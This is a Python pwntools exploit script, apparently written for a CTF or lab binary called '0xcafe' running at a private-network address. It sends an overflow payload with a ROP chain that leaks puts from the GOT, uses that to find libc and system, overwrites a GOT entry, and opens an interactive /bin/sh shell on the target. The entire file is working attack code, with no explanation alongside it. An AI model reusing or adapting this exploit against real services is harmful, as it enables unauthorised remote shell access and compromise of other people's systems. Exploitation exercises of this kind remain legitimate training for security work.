#!/usr/bin/python

from pwn import *

offset_puts   = 0x05f140 # 0x05f870
offset_system = 0x03a940 # 0x03ab30
offset_str_bin_sh = 0x158e8b 

puts_plt = 0x8048450
gets_plt = 0x8048430

puts_got = 0x804b01c 
gets_got = 0x804b014 
strcmp_got = 0x804b00c

puts_got_plt = 0x8048450
gets_got_plt = 0x804b014
new_system_plt = puts_plt
new_bin_sh_str = gets_got
pr = 0x08048a8b


# payload = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"

def main() :

	# p = process("./0xcafe")
	# raw_input(str(p.proc.pid))
	
	p = remote("192.168.0.31", 10001)

	data = p.recvrepeat(0.2)
	log.info(data)


	# payload = "A" * 228 #84 #68
	# # payload += "BBBB"
	# # payload += p32(puts_plt) # puts
	payload = p32(0x080493c9) * 50
	payload += p32(puts_plt)	
	payload += p32(pr)
	payload += p32(puts_plt)
	# payload += p32(puts_got)
	# payload += p32(puts_got_plt)

	payload += p32(gets_plt)
	payload += p32(pr)
	payload += p32(puts_got)	

	payload += p32(gets_plt)
	payload += p32(pr)
	payload += p32(gets_got)

	payload += p32(new_system_plt)
	payload += p32(0xdeadbeef) 
	payload += p32(new_bin_sh_str)

	payload = payload.rjust(256, "A")

	# payload = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G"

	log.info("Payload [len %d]: %s" % (len(payload), payload))

	# ret_addr = 0x0804857b

	# payload += p32(ret_addr)
	# payload += "\n"
	p.sendline(payload)

	data = p.recv(30)
	log.info(data)
	data = p.recvline()
	log.info(data)
	data = p.recvrepeat(0.2)
	log.info(data.encode("hex"))

	puts_addr = u32(data[:4])
	libc_base = puts_addr - offset_puts	
	system_addr = libc_base + offset_system
	# bin_sh_addr = libc_base + offset_str_bin_sh

	log.info("puts addr = 0x%x" % puts_addr)
	log.info("system addr = 0x%x" % system_addr)
	# log.info("/bin/sh addr = 0x%x" % bin_sh_addr)

	p.sendline(p32(system_addr))
	p.sendline("/bin/sh")

	p.interactive()

if __name__ == "__main__":
	main()